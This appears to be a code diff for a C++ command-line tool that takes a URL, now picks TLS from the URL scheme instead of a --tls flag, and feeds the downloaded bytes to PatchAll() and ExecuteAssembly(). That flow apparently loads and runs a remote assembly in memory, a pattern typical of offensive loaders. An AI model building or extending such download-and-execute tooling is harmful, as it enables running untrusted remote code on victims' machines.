@@ -62,10 +62,6 @@ int main(int argc, char* argv[])
             }
             url = argv[++i];
         }
-        else if (arg == "--tls")
-        {
-            useTls = true;
-        }
         else
         {
             std::cerr << "Unknown option: " << arg << "\n";
@@ -76,6 +72,21 @@ int main(int argc, char* argv[])
     if (url.empty())
     {
         std::cerr << "Missing required argument: --url\n";
+        return 1;
+    }
+
+    // Determine TLS automatically based on URL scheme
+    if (url.rfind("https://", 0) == 0)
+    {
+        useTls = true;
+    }
+    else if (url.rfind("http://", 0) == 0)
+    {
+        useTls = false;
+    }
+    else
+    {
+        std::cerr << "Invalid or missing URL scheme (must start with http:// or https://)\n";
         return 1;
     }
 
@@ -117,17 +128,13 @@ int main(int argc, char* argv[])
 
     std::cout << "(debug)--> responseBytes.size() = "
         << responseBytes.size() << std::endl;
-    std::string out;
-    BOOL ok;
 
     PatchAll();
-
-    ok = ExecuteAssembly(
-        out,
+    
+    ExecuteAssembly(
         responseBytes,
         extraArgs
     );
 
-    std::cout << out;
     return 0;
 }
